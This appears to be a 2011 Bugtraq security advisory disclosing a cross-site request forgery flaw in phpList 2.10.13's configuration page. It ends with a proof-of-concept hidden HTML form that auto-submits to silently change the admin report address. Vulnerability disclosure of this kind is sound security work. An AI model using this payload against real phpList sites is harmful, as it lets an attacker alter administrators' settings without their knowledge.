
Date: Tue, 26 Apr 2011 16:08:00 +0200 (CEST)
From: advisory@...ridge.ch
To: bugtraq@...urityfocus.com
Subject: HTB22957: XSRF (CSRF) in phpList

Vulnerability ID: HTB22957
Reference: http://www.htbridge.ch/advisory/xsrf_csrf_in_phplist.html
Product: phpList
Vendor: Tincan Ltd ( http://www.phplist.com/ ) 
Vulnerable Version: 2.10.13 and probably prior versions
Vendor Notification: 12 April 2011 
Vulnerability Type: CSRF (Cross-Site Request Forgery)
Risk level: Low 
Credit: High-Tech Bridge SA Security Research Lab ( http://www.htbridge.ch/advisory/ ) 

Vulnerability Details:
The vulnerability exists due to failure in the "admin/configure.php" script to properly verify the source of HTTP request.

Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.

Attacker can use browser to exploit this vulnerability. The following PoC is available:

<form action="http://host/admin/?page=configure&id=report_address" method="post" name="main" enctype="multipart/form-data">
<input type="hidden" name="formtoken" value="123">
<input type="hidden" name="id" value="report_address">
<input type="hidden" name="values[report_address]" value="email@...mple.com">
<input type="hidden" name="save" value="1">
<input type="hidden" name="savebutton" value="Save changes">
</form>
<script>
document.main.submit();
</script>



